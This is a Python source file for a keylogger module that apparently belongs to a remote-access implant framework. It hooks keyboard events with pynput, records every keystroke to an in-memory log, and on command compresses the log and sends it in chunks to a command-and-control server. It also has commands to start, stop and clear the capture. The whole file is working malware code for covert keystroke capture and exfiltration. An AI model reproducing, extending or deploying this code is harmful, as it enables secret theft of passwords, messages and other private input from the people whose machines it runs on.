import logging, time

from io import StringIO
from gzip import compress as gzipup
from base64 import b64encode
from pynput import keyboard

from common import bcolors as bc

#Having to use gglobal buffer, because pynput doesn't support arguments
log_buf = ''

def parse_args(dropper, args):
    """PArse command arguments"""

    #Initial argument setup
    start = False
    dump = False
    kill = False
    clear = False
    settings = {}

    #Get (any) raw args
    if args:
        args = args.split(' ')
        for arg in args:
            if arg == '--start' or arg == '-s':
                start = True
            if arg == '--dump' or arg == '-d':
                dump = True
            if arg == '--kill' or arg == '-k':
                kill = True
            if arg == '--clear' or arg == '-c':
                clear = True


    #rationalise and test arguments into settings dict
    settings['start'] = True if start else False
    settings['dump'] = True if dump else False
    settings['kill'] = True if kill else False
    settings['clear'] = True if clear else False

    return settings

def on_press(key):
    """On key press, log key data to loggins module"""

    try:
        #Alphanumeric keys go here
        logging.info(str(key.char))
    except AttributeError:
        #Special keys
        log_key = '[' + key.name + ']'
        logging.info(str(log_key))
    except Exception as e:
        #log_buf += "<Exception : {}>".format(e)
        logging.info("<Exception : {}>".format(e))

def on_release(key):
    """On key release log data if special key"""
    try:
        #Alphanumeric keys go here
        key = key   #Like a pass, but checks we can access key data
        #Do nothing, for alphanumeric keys
    except AttributeError:
        #Special keys
        logging.info(str('[' + key.name + ' RELEASED]'))
    except Exception as e:
        logging.info("<Exception : {}>".format(e))

def dump_keylog(dropper):
    """Send large amounts of keylog data back to C2"""

    try:
        data = ''
        for line in dropper.log_stream.getvalue():
            data += str(line.strip())    #It's all on newlines otherwise
        print("DEBUG - keylog dump data : {}".format(data))
        data = gzipup(data.encode())
        #data = b64encode(data)
        i=0
        packet = data[i*1024:i*1024+1024]
        while len(packet) > 0:
            dropper.send(packet)
            packet = data[i*1024:i*1024+1024]
            i+=1
        #Some time to let sendall do it's thing before we EOF
        time.sleep(0.1)
        dropper.send('<BSEOF>')
        return True, "Keylog Dump complete."
    except Exception as e:
        print("DEBUG - Couldn't complete keylog dump because : {}.".format(e))
        return False, 'ERROR - Couldn\'t dump keylog : {}'.format(e)

def main(dropper, args=None):
    """start, stop, kill, clear and dump key logger and associated data"""

    #Get settings
    settings = parse_args(dropper, args)
    if not settings:
        bc.err("Error parsing args : {}".format(settings))
        return
    #Settings check
    if settings['start'] and settings['kill']:
        bc.warn("Cannot start AND kill at the same time.")
        dropper.send("ERROR - cannot start and kill simoultaneously")
        return

    #If not already created, make some dropper attributes
    try:
        print("DEBUG - Checking if required objects exist alread")
        dropper.keylogger
        dropper.log_stream
        logging.info("")
        print("DEBUG - it all exists!")
    except:
        print("DEBUG - they didn't exist...")
        dropper.keylogger = keyboard.Listener(
            on_press=on_press,
            on_release=on_release)
        dropper.log_stream = StringIO()
        logging.basicConfig(stream=dropper.log_stream, level=logging.INFO, format="%(message)s")

    #Start
    if settings['start'] and not dropper.keylogger.running:
        dropper.keylogger = keyboard.Listener(
            on_press=on_press,
            on_release=on_release)
        dropper.keylogger.start()
        dropper.send("Keylogger started in {}, {}".format(dropper.name, dropper.keylogger.running))
        return
    elif settings['start']:
        dropper.send("ERROR - Cannot start, logger already running")
        return

    #Kill
    if settings['kill'] and not dropper.keylogger.running:
        dropper.send("ERROR - Cannot stop, logger not yet running : {}".format(dropper.keylogger.running))
        return
    elif settings['kill']:
        print("DEBUG - Killing Keylogger")
        dropper.keylogger.stop()
        dropper.send("Keylogger stopped in {}".format(dropper.name))
        return

    #Dump
    if settings['dump']:
        print("Logged data : {}".format(dropper.log_stream.getvalue()))
        success, message = dump_keylog(dropper)
        if success:
            bc.success("Successful keylog dump!")
            dropper.send("{} : {}".format(dropper.name, message))
        else:
            bc.info("Keylog failed, sending error message.")
            dropper.send("DUMP failed : {}".format(message))
        return

    #Clear
    if settings['clear']:
        print("DEBUG - clearing")
        if dropper.keylogger.running:
            dropper.keylogger.stop()
            print("Logged data pre-clear : {}".format(dropper.log_stream.getvalue()))
            dropper.log_stream.truncate(0)  #Creating a new stringIO object iddn't seem to work
            print("Logged data post-clear: {}".format(dropper.log_stream.getvalue()))
            dropper.keylogger = keyboard.Listener(
                on_press=on_press,
                on_release=on_release)
            dropper.keylogger.start()
        else:
            dropper.log_stream.truncate(0)
        dropper.send("Keylogger buffer cleared in {}".format(dropper.name))
        return

    #Else it was nothing
    dropper.send("No valid keylogger commands provided.")
    return
